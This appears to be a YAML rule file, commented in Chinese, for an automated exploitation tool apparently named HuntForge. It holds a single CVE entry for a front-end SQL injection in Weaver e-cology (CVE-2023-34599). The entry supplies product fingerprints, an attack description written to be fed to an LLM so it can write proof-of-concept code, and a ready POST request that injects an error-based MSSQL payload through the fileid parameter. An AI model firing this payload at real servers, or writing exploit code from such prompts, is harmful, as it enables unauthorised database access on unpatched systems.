# HuntForge 内置 CVE 知识库（国产组件为主，托管环境无外网 → 离线直击）
#
# 每条：
#   cve       CVE 编号
#   product   组件/产品
#   severity  严重度（用于排序）
#   patterns  指纹正则列表（命中任一即认为组件存在）——匹配对象：
#             标题(title)/正文(body)/响应头(headers 拼串)/URL 路径(path)
#   versions  受影响版本特征正则（可选；不写=不校验版本）
#   attack    攻击路径简述（喂 LLM 编写 POC 时用）
#   payloads  内置请求模板列表（规则级直击）：{method, path, headers{}, data{}}
#             占位符 {target} 由引擎替换
#   confidence 规则直击置信度
cves:
  - cve: CVE-2023-34599
    product: 泛微 e-cology
    severity: critical
    patterns: ["e-cology", "weaver", "ecology/", "/wui/theme/ecology", "泛微"]
    attack: "泛微 e-cology FileDownloadForOutDoc 前台 SQL 注入（MSSQL 报错/时间盲注，POST /weaver/weaver.file.FileDownloadForOutDoc，fileid 注入点）。成熟脚本见 tools/pocs/weaver_sqli/"
    payloads:
      - method: POST
        path: /weaver/weaver.file.FileDownloadForOutDoc
        headers:
          Content-Type: application/x-www-form-urlencoded
        data: "fileid=1+AND+1=CONVERT(int,@@version)&isFromOutImg=1"
    confidence: 0.7

